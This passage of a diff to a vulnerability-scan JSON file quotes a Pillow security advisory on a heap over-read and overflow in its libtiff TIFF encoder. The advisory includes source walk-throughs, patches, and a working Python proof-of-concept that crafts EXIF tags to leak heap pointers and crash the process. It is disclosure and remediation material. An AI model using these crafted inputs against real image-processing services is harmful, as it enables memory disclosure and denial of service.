via `supplied_tags` (`im.tag_v2`, `:1782`), is forwarded to libtiff. A palette TIFF with `SamplesPerPixel=2, BitsPerSample=(8,8), ExtraSamples=(0,)` opens as mode `P` (rawmode `PX`, extra sample dropped), and a bare `im.save(out, \"TIFF\")` — no save arguments; `compression` and `Predictor` are inherited from the source — already makes libtiff process `2*width` bytes per row from a `width`-byte buffer.\n\n`ImagingLibTiffEncode` then hands the image-sized row buffer to `TIFFWriteScanline`, and libtiff reads one scanline of the *tag-described* geometry out of a buffer holding one row of the *actual* image. With `Predictor = 2` (also forwarded from `tiffinfo=` / `im.tag_v2`) libtiff's horizontal differencing first rewrites the whole scanline **in place**, so the over-read becomes an out-of-bounds heap **write** on every row.\n\nThe tags do not have to be supplied deliberately by the application: `im.getexif()` of an uploaded JPEG returns whatever IFD0 tags the file carries, and the common metadata-preserving conversion\n\n```python\nim = Image.open(uploaded_jpeg)                                   # 64x4, mode \"L\"\nim.save(out, \"TIFF\", exif=im.getexif(), compression=\"tiff_lzw\")\n```\n\nbehaves as follows on the stock build at this commit:\n\n- EXIF IFD0 `{277: 3, 262: 2}` (SamplesPerPixel=3, Photometric=RGB): the save succeeds and `out` is a 64x4 **RGB** TIFF. Re-opening it, the first 64 bytes of every 192-byte row are the image (0x11 fill); the remaining 128 bytes are heap that followed the 64-byte row buffer — e.g. `... 807a97e6527f0000 ... f03632e5527f0000 40832ee5527f0000` (x86-64 heap pointers), different on every run.\n- EXIF IFD0 `{256: 1\u003c\u003c27}` (ImageWidth=2^27): the process dies with SIGSEGV; gdb shows `TIFFWriteScanline (libtiff.so.6) ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1035) ← _encode (src/encode.c:139)`.\n- valgrind on the first case: `Invalid read of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode … Address is 0 bytes after a block of size 64 alloc'd at calloc by _setimage`.\n- Control: the same JPEG with an EXIF holding only `Software` produces a 64x4 `L` TIFF whose 256 pixel bytes are all 0x11.\n\nThe write variant needs nothing more than a well-formed 222-byte TIFF and the `exif=im.getexif()` idiom the project's own tests use (`Tests/test_file_tiff.py::test_exif`, `test_modify_exif`); the interpreter dies with glibc's `free(): invalid next size (fast)` (SIGABRT):\n\n```python\nfrom PIL import Image; import io\nb = io.BytesIO()\nImage.new(\"RGB\", (64, 4)).save(b, \"TIFF\", compression=\"tiff_lzw\", tiffinfo={274: 6, 317: 2})  # Orientation=6, Predictor=2\nim = Image.open(io.BytesIO(b.getvalue())); im.load()   # auto-transposed to 4x64; tag_v2/getexif() still say 64x4\nim.save(io.BytesIO(), \"TIFF\", exif=im.getexif())       # or tiffinfo=im.tag_v2\n```\n\nHere libtiff processes 192-byte rows (64 px × 3 samples) from the 12-byte buffer `_setimage` allocated for a 4-pixel RGB row, and `PredictorEncodeRow` rewrites the 180 heap bytes that follow it on each of 64 rows; valgrind on a `-g` build reports `Invalid write of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode (TiffDecode.c:1035) … Address is 0 bytes after a block of size 12 alloc'd … by _setimage (encode.c:293)`. `im.thumbnail((8, 8))` before the save instead of the Orientation tag reaches the same state, as does the purely programmatic `Image.new(\"RGB\", (128, 32)).save(fp, \"TIFF\", compression=\"tiff_lzw\", tiffinfo={256: 1024, 257: 128, 317: 2})` (SIGSEGV). For the source-IFD `SamplesPerPixel` route, a crafted \u003c2 KB palette `PX` TIFF with `Compression = LZW, Predictor = 2` kills the stock build on a bare `Image.open(f).save(out, \"TIFF\")`; with a predictor-less codec the same re-save returns normally with `width` bytes of heap per row encoded into the output.\n\n### Walk-through\n\n`_save` seeds the output IFD from the image and then copies the caller's tags over it:\n\n```python\n# src/PIL/TiffImagePlugin.py\n1746    libtiff = WRITE_LIBTIFF or compression != \"raw\"\n1749    ifd[PLANAR_CONFIGURATION] = 1\n1751    ifd[IMAGEWIDTH] = im.size[0]\n1752    ifd[IMAGELENGTH] = im.size[1]\n        …\n1757    elif \"exif\" in encoderinfo:\n1758        info = encoderinfo[\"exif\"]          # Image.Exif, or bytes → Exif\n        …\n1768    for key in info:\n            …\n1772            ifd[key] = info.get(key)            # 256/257/277/262/284/317 … overwrite the above\n```\n\nThe geometry is only partially re-asserted afterwards: `BITSPERSAMPLE` is always set, but `SAMPLESPERPIXEL` only for multi-band modes and `IMAGEWIDTH`/`IMAGELENGTH` never:\n\n```python\n1847    if bits != (1,):\n1848        ifd[BITSPERSAMPLE] = bits\n1849        if len(bits) != 1:\n1850            ifd[SAMPLESPERPIXEL] = len(bits)    # not reached for L, P, I, F, I;16 …\n1856    if PHOTOMETRIC_INTERPRETATION not in ifd:   # supplied value kept\n```\n\nIn the libtiff branch every IFD entry that is not block-listed — and, after the IFD, every entry of `supplied_tags` (the source file's `im.tag_v2`) not already present — becomes a `TIFFSetField` argument. The only tag pinned to the image's real value is `BITSPERSAMPLE`:\n\n```python\n1955        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}\n1959        for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):\n            …\n1976            if tag not in atts and tag not in blocklist:\n                    …   atts[tag] = value\n2002        encoder = Image._getencoder(im.mode, \"libtiff\", a, encoderconfig)\n2003        encoder.setimage(im.im, (0, 0, *im.size))\n```\n\nFor the SamplesPerPixel=3 example the tag list passed to the encoder is `[(256, 64), (257, 4), (258, 8), (259, 5), (262, 2), (277, 3), (278, 4), (284, 1)]`; for the ImageWidth example it is `[(256, 134217728), (257, 4), (258, 8), …]`. 256 and 277 are in `core_tags` (`src/encode.c:694`), so `PyImaging_LibTiffEncoderNew` forwards them straight to `TIFFSetField`. For a single-band image `SAMPLESPERPIXEL` is absent from `ifd`, so the loop takes tag 277 from `supplied_tags` — the source TIFF's IFD — when one is present; the `PLANAR_CONFIGURATION == 2` adjustment at `:1783-1788` already compensates for this for separate-planes sources, the contiguous `PX` layout is the remaining case.\n\n`encoder.setimage` sizes the packer's row buffer from the real image — 64 bytes for a 64-pixel `L` row:\n\n```c\n/* src/encode.c, _setimage */\n287    if (state-\u003ebits \u003e 0) {\n291        state-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;\n293        state-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n```\n\nand `ImagingLibTiffEncode` packs one image row into it and gives the pointer to libtiff with no length:\n\n```c\n/* src/libImaging/TiffDecode.c */\n1027        while (state-\u003ey \u003c state-\u003eysize) {\n1028            state-\u003eshuffle(state-\u003ebuffer, (UINT8 *)im-\u003eimage[state-\u003ey + state-\u003eyoff] + …, state-\u003exsize);\n1035            if (TIFFWriteScanline(tiff, (tdata_t)(state-\u003ebuffer), (uint32_t)state-\u003ey, 0) == -1) {\n```\n\n`TIFFWriteScanline` consumes `TIFFScanlineSize()` bytes, i.e. `ImageWidth * SamplesPerPixel * BitsPerSample / 8` as set through the tags. Nothing between `_save` and line 1035 compares that with `state-\u003ebytes`. With SamplesPerPixel=3 libtiff reads 192 bytes from the 64-byte block and LZW-encodes the trailing 128 heap bytes into the strip; with ImageWidth=2^27 it reads 128 MiB starting at the 64-byte block and faults. With `Predictor = 2`, libtiff's `PredictorEncodeRow` first runs horizontal differencing in place over the whole scanline (`bp[i] -= bp[i-stride]`), i.e. it rewrites the heap bytes that follow the block before encoding them; libtiff grows `ImageLength` as rows beyond the declared count are written, so every row of the real image goes through. A `PlanarConfiguration = 2` carried over from a planar source reaches libtiff by the same route; there libtiff's scanline (one sample plane) is shorter than Pillow's row, so the result is an undecodable file rather than an out-of-bounds access.\n\nThe non-libtiff path (`compression` absent/raw) is not affected: it goes through `ImagingRawEncode`, which treats the IFD-derived stride as padding and either zero-fills or fails with `IMAGING_CODEC_CONFIG` (`src/libImaging/RawEncode.c:34-37,57-59`). Overriding `IMAGEWIDTH`/`IMAGELENGTH` through `tiffinfo` on that path is an intended feature (`Tests/test_file_tiff.py::test_tiff_chunks`).\n\nThe `exif=` route was introduced in `c0f619384cbc` (\"Added \"exif\" keyword argument to save Image.Exif instance\", 2021-07-04), first released in 8.4.0. The same override through `tiffinfo=` is older: it dates back to `dbf47837ce99` (\"Add arbitrary tags to tiff images using an ImageFileDirectory\", 2013-10-02, first in 2.3.0). The stale-geometry-from-the-file-itself form dates from `1b70a4c6b515` (\"Use TIFF orientation\", 2019-09-13, first in 6.2.0), which added the transpose on load.\n\n## Impact\n\nAffected are applications that write TIFF output from user-supplied images through libtiff. Through the source-IFD `SamplesPerPixel` route nothing more is needed than `Image.open(f).save(out, \"TIFF\")` (format normalisation) on a crafted palette TIFF: `Compression`, `SamplesPerPixel` and `Predictor` are all inherited from the upload, so the uploader chooses between heap corruption / worker abort (`Predictor = 2`) and a normally-returning save whose output carries `width` bytes of the worker's heap per row. The `exif=` / `tiffinfo=` routes cover applications that convert to compressed TIFF while carrying the metadata across — `im.save(..., \"TIFF\", compression=\"tiff_lzw\"|\"tiff_adobe_deflate\"|\"packbits\"|\"jpeg\"|…, exif=im.getexif())`, `exif=im.info[\"exif\"]`, or `tiffinfo=` built from the source file's tags. Neither option is a default, but both are ordinary settings for archival/print/scan pipelines and the idiom used in Pillow's own tests. The uploader then chooses the outcome through a few EXIF shorts: a small `SamplesPerPixel` (with a matching `Photometric` so the result is a valid RGB/CMYK TIFF) returns `(spp-1) × width` bytes of process heap per image row inside the produced file — for a 4000-pixel-wide upload that is 8 KB of heap per row, megabytes per file, readable with any TIFF decoder and containing allocator metadata, pointers (ASLR defeat) and whatever other requests left in freed memory; a large `ImageWidth` kills the worker with SIGSEGV; `ImageWidth`/`ImageLength` larger than the (transposed or thumbnailed) image together with `Predictor = 2` writes `(declared_width − real_width) × bytes_per_pixel` bytes past a small fresh `calloc` block on every row — the values written are byte-wise differences of the existing heap contents, so the attacker controls extent and repetition but not directly the data; the observed result is heap corruption and abort of the whole worker, exploitation beyond that is not demonstrated. Because `ImageWidth`/`ImageLength` are routinely present in IFD0 of camera and scanner output, a benign photo that is resized before such a save also over-reads (its EXIF still describes the original width), so the crash variant can occur without an attacker.\n\n## Reproducing\n\n`repro` is a single Python script that uses the installed Pillow and only its public API; no rebuild is needed. It runs in well under a second.\n\nIt builds the attacker's input in memory: a 64x4 JPEG in mode `L` with every pixel set to 0x11, plus a chosen set of EXIF IFD0 tags. It then runs the metadata-preserving conversion an application would do:\n\n```python\nim = Image.open(io.BytesIO(jpeg))\nim.save(out, \"TIFF\", exif=im.getexif(), compression=\"tiff_lzw\")\n```\n\nFinally it re-opens the TIFF that comes out. There are three cases:\n\n- **control**: the EXIF holds only `Software`. The output is a 64x4 `L` TIFF whose 256 bytes are all 0x11. The verdict can only be `BUG` if this holds.\n- **leak**: the EXIF holds `SamplesPerPixel=3, PhotometricInterpretation=RGB`. libtiff now treats each scanline as 192 bytes, but the row buffer only holds 64 bytes. The save still succeeds and the output is a 64x4 **`RGB`** TIFF. In each 192-byte row, the first 64 bytes are the image (0x11). The other 128 bytes are whatever sat in the heap after the 64-byte row buffer.\n  - The script hex-dumps row 0's extra bytes. They include x86-64 pointers such as `…e06c297e677f0000`, which change from run to run because of ASLR.\n  - It also counts the extra bytes that are neither 0x11 nor 0x00, since those could not have come from the image or from zero padding. On the stock build this is a few hundred of the 512 bytes (200–310 in our runs).\n- **crash**: the EXIF holds `ImageWidth=2**27`. The script re-runs itself as a child process (`repro crash`) with core dumps disabled. libtiff tries to read 128 MiB out of the 64-byte buffer, and the child dies with SIGSEGV (exit code -11).\n\nExpected output on the stock build (the heap bytes and the count vary):\n\n```\ncontrol: L (64, 4), all bytes 0x11: True\nleak:    RGB (64, 4)\n         first 64 bytes of each row are the image (0x11): True\n         row 0, bytes 64..192 (past the row buffer):\n           0000000000000000310000000000000090e5b50669550000e06c297e677f0000\n           0000000001007900007b8804d80c0d8830000000000000001007000000000000\n           0100000000000000801a897e677f0000240300000000000030444a7d677f0000\n           4095487d677f0000885f897e677f000003000001010000000000000000000000\n         220 of 512 bytes past the row buffers are neither 0x11 nor 0x00\ncrash:   child exit code -11 (SIGSEGV)\nBUG\n```\n\nThe last line is `BUG` if the control is clean and the leak case produced foreign bytes, the crash case died with SIGSEGV/SIGBUS, or both. Otherwise it is `OK`.\n\nWith either attached patch applied and rebuilt, the script prints:\n\n```\ncontrol: L (64, 4), all bytes 0x11: True\nleak:    output is not a readable image (no over-read)\ncrash:   child exit code 0 (no signal)\nOK\n```\n\nIn the leak case, the fixed build writes the image's real single sample per pixel but keeps the supplied `Photometric=RGB`. Pillow will not open a TIFF like that.\n\nThe out-of-bounds write variant is the three-line `Orientation=6, Predictor=2` snippet in Details (SIGABRT, `free(): invalid next size (fast)` on the stock build); for a file:line stack run it under valgrind on a `-g` build of the extensions.\n\n## Suggested fix\n\nTwo alternative patches are attached. Patch 2 is the Python-only subset of patch 1; patch 1 also hardens the C encoder.\n\n**Attached patch 1** (`src/PIL/TiffImagePlugin.py`, `src/libImaging/TiffDecode.c`) does two independent things:\n\n1. `src/PIL/TiffImagePlugin.py:1955` — the libtiff branch already pre-seeds `atts` with `BITSPERSAMPLE` so that no supplied tag can replace it. The patch extends that to the other tags that determine libtiff's scanline size, taken from the image being saved:\n\n```diff\n-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}\n+        atts: dict[int, Any] = {\n+            BITSPERSAMPLE: bits[0],\n+            SAMPLESPERPIXEL: len(bits),\n+            IMAGEWIDTH: im.size[0],\n+            IMAGELENGTH: im.size[1],\n+            PLANAR_CONFIGURATION: 1,\n+        }\n```\n\n   Doing it here rather than in the IFD built at 1749–1772 leaves the raw-writer behaviour exercised by `test_tiff_chunks` untouched, and because the merge loop visits `ifd` and `supplied_tags` only for tags not already in `atts`, it closes the `exif=`, `tiffinfo=` and source-IFD (`im.tag_v2`) routes alike. A supplied `PHOTOMETRIC_INTERPRETATION` still reaches the file (so EXIF `{277:3, 262:2}` now yields a 1-sample \"RGB\" TIFF that Pillow refuses to open); whether to force it to the mode's value is a format decision that no longer affects memory safety. For the re-saved `PX` palette case it may also be worth dropping the source's `EXTRASAMPLES` from `supplied_tags` (meaningless once the extra channel was discarded on load), as is already done for the planar case at `:1783-1788`, so the output is a self-consistent 1-sample palette file.\n\n2. `src/libImaging/TiffDecode.c`, `ImagingLibTiffEncode` — before the scanline loop, it refuses any configuration in which libtiff would read more than the packer produced, so the encoder stays safe regardless of where tags come from:\n\n```c\n        if (TIFFScanlineSize64(tiff) \u003e (uint64_t)state-\u003ebytes) {\n            state-\u003eerrcode = IMAGING_CODEC_CONFIG;\n            ImagingLibTiffEncodeCleanup(state);\n            clientstate-\u003etiff = NULL;\n            if (!clientstate-\u003efp) {\n                free(clientstate-\u003edata);\n            }\n            return -1;\n        }\n```\n\n   The same cleanup is applied to the existing `TIFFWriteScanline` error path. For in-memory output, that path currently frees `clientstate-\u003edata` but leaves `clientstate-\u003etiff` set, so the later `ImagingLibTiffEncodeCleanup` → `TIFFClose` → `TIFFFlush` writes into the freed buffer. Both error paths now close the TIFF before the data is freed. The `TIFFFlush` failure branch further down (`src/libImaging/TiffDecode.c:1056`) has the same pattern and is left as it is.\n\n**Attached patch 2** (`src/PIL/TiffImagePlugin.py` only) is step 1 above without the C changes, for maintainers who prefer not to touch the encoder. It closes every public-API route (`exif=`, `tiffinfo=`, a resized or transposed image's carried-over EXIF/`tag_v2`) by which these tags reach `TIFFSetField`. `ImagingLibTiffEncode` still trusts its tag list, though, and the error-path use-after-free described above stays as it is.\n\nBoth patches add `Tests/test_file_libtiff.py::test_geometry_tags`, parametrised over oversized `IMAGEWIDTH`/`IMAGELENGTH`, `SAMPLESPERPIXEL=3` and `PLANAR_CONFIGURATION=2`. With either patch applied to a clean checkout and rebuilt, `repro` prints `OK`, the `Predictor = 2` snippet in Details saves a 4×64 image normally, and the existing TIFF test suites still pass.\n\n## The patch (1 of 2)\n\nTake libtiff scanline geometry tags from the image, not tiffinfo/exif, and make ImagingLibTiffEncode reject a scanline larger than its row buffer\n\nApplies to `src/PIL/TiffImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..36fe5f6b9 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -395,6 +395,28 @@ class TestFileLibTiff(LibTiffTestCase):\n         with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n             im.save(out, tiffinfo=ifd)\n \n+    @pytest.mark.parametrize(\n+        \"tiffinfo\",\n+        (\n+            {TiffImagePlugin.IMAGEWIDTH: 1 \u003c\u003c 27},\n+            {TiffImagePlugin.IMAGELENGTH: 1 \u003c\u003c 27},\n+            {TiffImagePlugin.SAMPLESPERPIXEL: 3},\n+            {TiffImagePlugin.PLANAR_CONFIGURATION: 2},\n+        ),\n+    )\n+    def test_geometry_tags(\n+        self, tiffinfo: dict[int, int], monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n+    ) -\u003e None:\n+        # The geometry of the image is used, not the geometry from tiffinfo.\n+        # Otherwise libtiff would read past the end of the row buffer.\n+        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n+\n+        out = tmp_path / \"temp.tif\"\n+        im = hopper(\"L\")\n+        im.save(out, tiffinfo=tiffinfo)\n+\n+        assert_image_equal_tofile(im, out)\n+\n     def test_inknames_tag(\n         self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n     ) -\u003e None:\ndiff --git a/src/PIL/TiffImagePlugin.py b/src/PIL/TiffImagePlugin.py\nindex 42c1cc96c..aa0895966 100644\n--- a/src/PIL/TiffImagePlugin.py\n+++ b/src/PIL/TiffImagePlugin.py\n@@ -1952,7 +1952,16 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n         ]\n \n         # bits per sample is a single short in the tiff directory, not a list.\n-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}\n+        # The tags that determine the size of a scanline are taken from the image,\n+        # not from tiffinfo/exif: libtiff reads a scanline of the size that they\n+        # describe from a buffer that holds one row of the image.\n+        atts: dict[int, Any] = {\n+            BITSPERSAMPLE: bits[0],\n+            SAMPLESPERPIXEL: len(bits),\n+            IMAGEWIDTH: im.size[0],\n+            IMAGELENGTH: im.size[1],\n+            PLANAR_CONFIGURATION: 1,\n+        }\n         # Merge the ones that we have with (optional) more bits from\n         # the original file, e.g x,y resolution so that we can\n         # save(load('')) == original file.\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..6570666fc 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -1023,6 +1023,23 @@ ImagingLibTiffEncode(Imaging im, ImagingCodecState state, UINT8 *buffer, int byt\n     dump_state(clientstate);\n \n     if (state-\u003estate == 0) {\n+        // state-\u003ebuffer holds one row of the image, but TIFFWriteScanline reads\n+        // a scanline of the size described by the IMAGEWIDTH, SAMPLESPERPIXEL\n+        // and BITSPERSAMPLE tags, so these must not describe a larger row.\n+        if (TIFFScanlineSize64(tiff) \u003e (uint64_t)state-\u003ebytes) {\n+            TRACE((\"Scanline size exceeds the row buffer\\n\"));\n+            state-\u003eerrcode = IMAGING_CODEC_CONFIG;\n+\n+            // Closing the tiff flushes it into clientstate-\u003edata, so do that\n+            // before the data is freed, rather than in the encoder cleanup.\n+            ImagingLibTiffEncodeCleanup(state);\n+            clientstate-\u003etiff = NULL;\n+            if (!clientstate-\u003efp) {\n+                free(clientstate-\u003edata);\n+            }\n+            return -1;\n+        }\n+\n         TRACE((\"Encoding line by line\"));\n         while (state-\u003ey \u003c state-\u003eysize) {\n             state-\u003eshuffle(\n@@ -1038,10 +1055,9 @@ ImagingLibTiffEncode(Imaging im, ImagingCodecState state, UINT8 *buffer, int byt\n                 TRACE((\"Encode Error, row %d\\n\", state-\u003ey));\n                 state-\u003eerrcode = IMAGING_CODEC_BROKEN;\n \n-                if (clientstate-\u003efp) {\n-                    TIFFCleanup(tiff);\n-                    clientstate-\u003etiff = NULL;\n-                } else {\n+                ImagingLibTiffEncodeCleanup(state);\n+                clientstate-\u003etiff = NULL;\n+                if (!clientstate-\u003efp) {\n                     free(clientstate-\u003edata);\n                 }\n                 return -1;\n```\n\n## The patch (2 of 2)\n\nTake libtiff scanline geometry tags (width, length, samples per pixel, planar config) from the image being saved instead of tiffinfo/exif\n\nApplies to `src/PIL/TiffImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..36fe5f6b9 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -395,6 +395,28 @@ class TestFileLibTiff(LibTiffTestCase):\n         with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n             im.save(out, tiffinfo=ifd)\n \n+    @pytest.mark.parametrize(\n+        \"tiffinfo\",\n+        (\n+            {TiffImagePlugin.IMAGEWIDTH: 1 \u003c\u003c 27},\n+            {TiffImagePlugin.IMAGELENGTH: 1 \u003c\u003c 27},\n+            {TiffImagePlugin.SAMPLESPERPIXEL: 3},\n+            {TiffImagePlugin.PLANAR_CONFIGURATION: 2},\n+        ),\n+    )\n+    def test_geometry_tags(\n+        self, tiffinfo: dict[int, int], monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n+    ) -\u003e None:\n+        # The geometry of the image is used, not the geometry from tiffinfo.\n+        # Otherwise libtiff would read past the end of the row buffer.\n+        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n+\n+        out = tmp_path / \"temp.tif\"\n+        im = hopper(\"L\")\n+        im.save(out, tiffinfo=tiffinfo)\n+\n+        assert_image_equal_tofile(im, out)\n+\n     def test_inknames_tag(\n         self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n     ) -\u003e None:\ndiff --git a/src/PIL/TiffImagePlugin.py b/src/PIL/TiffImagePlugin.py\nindex 42c1cc96c..aa0895966 100644\n--- a/src/PIL/TiffImagePlugin.py\n+++ b/src/PIL/TiffImagePlugin.py\n@@ -1952,7 +1952,16 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n         ]\n \n         # bits per sample is a single short in the tiff directory, not a list.\n-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}\n+        # The tags that determine the size of a scanline are taken from the image,\n+        # not from tiffinfo/exif: libtiff reads a scanline of the size that they\n+        # describe from a buffer that holds one row of the image.\n+        atts: dict[int, Any] = {\n+            BITSPERSAMPLE: bits[0],\n+            SAMPLESPERPIXEL: len(bits),\n+            IMAGEWIDTH: im.size[0],\n+            IMAGELENGTH: im.size[1],\n+            PLANAR_CONFIGURATION: 1,\n+        }\n         # Merge the ones that we have with (optional) more bits from\n         # the original file, e.g x,y resolution so that we can\n         # save(load('')) == original file.\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 4,352 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nHeap over-read in Pillow's libtiff encoder, driven by EXIF tags of an uploaded file.\n\nAn application converts an uploaded JPEG to compressed TIFF and keeps its metadata:\n\n    im.save(out, \"TIFF\", exif=im.getexif(), compression=\"tiff_lzw\")\n\nTiffImagePlugin._save forwards the EXIF's ImageWidth (256) / SamplesPerPixel (277) to\nlibtiff, so libtiff's scanline size follows the EXIF, while the row buffer that\nImagingLibTiffEncode hands to TIFFWriteScanline (src/libImaging/TiffDecode.c:1035) is\nsized from the real image (src/encode.c:291). libtiff reads past the end of it.\n\n  control  EXIF {Software}                       -\u003e 64x4 \"L\" TIFF, every byte 0x11\n  leak     EXIF {SamplesPerPixel=3, Photometric=RGB}\n                                                 -\u003e 64x4 \"RGB\" TIFF: 64 image bytes + 128\n                                                    bytes of process heap in every row\n  crash    EXIF {ImageWidth=2**27}               -\u003e libtiff reads 128 MiB from a 64-byte\n                                                    buffer: SIGSEGV\n\"\"\"\nimport io\nimport resource\nimport signal\nimport subprocess\nimport sys\n\nfrom PIL import Image, UnidentifiedImageError\n\nW, H, GREY = 64, 4, 0x11\n\n\ndef uploaded_jpeg(exif_tags):\n    \"\"\"The attacker's file: a 64x4 solid-grey JPEG whose EXIF IFD0 holds exif_tags.\"\"\"\n    exif = Image.Exif()\n    exif.update(exif_tags)\n    buf = io.BytesIO()\n    Image.new(\"L\", (W, H), GREY).save(buf, \"JPEG\", quality=100, exif=exif.tobytes())\n    return buf.getvalue()\n\n\ndef convert_to_tiff(jpeg):\n    \"\"\"The application: metadata-preserving conversion to LZW TIFF.\n\n    Returns the resulting TIFF re-opened, or None if Pillow cannot read it back.\"\"\"\n    im = Image.open(io.BytesIO(jpeg))\n    out = io.BytesIO()\n    im.save(out, \"TIFF\", exif=im.getexif(), compression=\"tiff_lzw\")\n    try:\n        return Image.open(out)\n    except UnidentifiedImageError:\n        return None\n\n\nif sys.argv[1:] == [\"crash\"]:\n    # Child process for the crash case (see the end of the script).\n    convert_to_tiff(uploaded_jpeg({256: 1 \u003c\u003c 27}))  # ImageWidth = 2**27\n    sys.exit(0)\n\n\n# --- Control: EXIF without geometry tags converts cleanly ----------------------------\ntiff = convert_to_tiff(uploaded_jpeg({305: \"control\"}))  # Software\ncontrol_clean = (tiff.mode, tiff.size) == (\"L\", (W, H)) and set(tiff.tobytes()) == {GREY}\nprint(f\"control: {tiff.mode} {tiff.size}, all bytes 0x{GREY:02x}: {control_clean}\")\n\n\n# --- Leak: EXIF says 3 samples per pixel, so libtiff reads 3*64 bytes per row --------\n# from the 64-byte row buffer. Everything past byte 64 of each row is not image data.\ntiff = convert_to_tiff(uploaded_jpeg({277: 3, 262: 2}))  # SamplesPerPixel, Photometric=RGB\nleaked = False\nif tiff is None:\n    # A fixed build writes the image's real 1 sample per pixel, and Pillow will not\n    # open a 1-sample \"RGB\" TIFF: nothing was read past the row buffer.\n    print(\"leak:    output is not a readable image (no over-read)\")\nelse:\n    pixels = tiff.tobytes()\n    row = W * 3\n    image_part = b\"\".join(pixels[y * row : y * row + W] for y in range(H))\n    beyond = b\"\".join(pixels[y * row + W : (y + 1) * row] for y in range(H))\n    # Bytes that are neither the image's grey nor zero padding can only be heap contents.\n    foreign = sum(b not in (GREY, 0) for b in beyond)\n    print(f\"leak:    {tiff.mode} {tiff.size}\")\n    print(f\"         first {W} bytes of each row are the image (0x{GREY:02x}): \"\n          f\"{set(image_part) == {GREY}}\")\n    print(f\"         row 0, bytes {W}..{row} (past the row buffer):\")\n    for i in range(W, row, 32):\n        print(\"           \" + pixels[i : i + 32].hex())\n    print(f\"         {foreign} of {len(beyond)} bytes past the row buffers are neither \"\n          f\"0x{GREY:02x} nor 0x00\")\n    leaked = foreign \u003e 0\n\n\n# --- Crash: EXIF says the image is 2**27 pixels wide ---------------------------------\nchild = subprocess.run(\n    [sys.executable, __file__, \"crash\"],\n    preexec_fn=lambda: resource.setrlimit(resource.RLIMIT_CORE, (0, 0)),  # no core file\n    capture_output=True,\n)\ncrashed = child.returncode in (-signal.SIGSEGV, -signal.SIGBUS)\noutcome = signal.Signals(-child.returncode).name if child.returncode \u003c 0 else \"no signal\"\nprint(f\"crash:   child exit code {child.returncode} ({outcome})\")\n\n\nprint(\"BUG\" if control_clean and (leaked or crashed) else \"OK\")\n```\n\u003c/details\u003e",
+              "id": "GHSA-xcvg-w56q-r89m",
+              "modified": "2026-11-12T23:45:03.322245161Z",
+              "published": "2026-11-12T23:34:43Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-xcvg-w56q-r89m"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/commit/53318b50e8e9e85a57d033d4d879e1398d97aeb1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/commit/ec5f1cbcf67275641abaad5c065ffb64a0a804a9"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/python-pillow/Pillow"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Pillow: Heap buffer overflow saving TIFF with libtiff when tags override image size"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 12.3.0",
                     "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xgh8-jp6q-p5x8/GHSA-xgh8-jp6q-p5x8.json"
                   },
                   "package": {
@@ -104512,7 +105508,603 @@
             "name": "soupsieve",
             "version": "2.9.2",
             "ecosystem": "PyPI"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4j63-6c4x-wfg4"
+              ],
+              "aliases": [
+                "CVE-2026-126192",
+                "GHSA-4j63-6c4x-wfg4"
+              ],
+              "max_severity": "6.3"
+            },
+            {
+              "ids": [
+                "GHSA-6655-6qjp-jx7x"
+              ],
+              "aliases": [
+                "CVE-2026-126191",
+                "GHSA-6655-6qjp-jx7x"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-7g44-g9rc-x53w"
+              ],
+              "aliases": [
+                "CVE-2026-126193",
+                "GHSA-7g44-g9rc-x53w"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
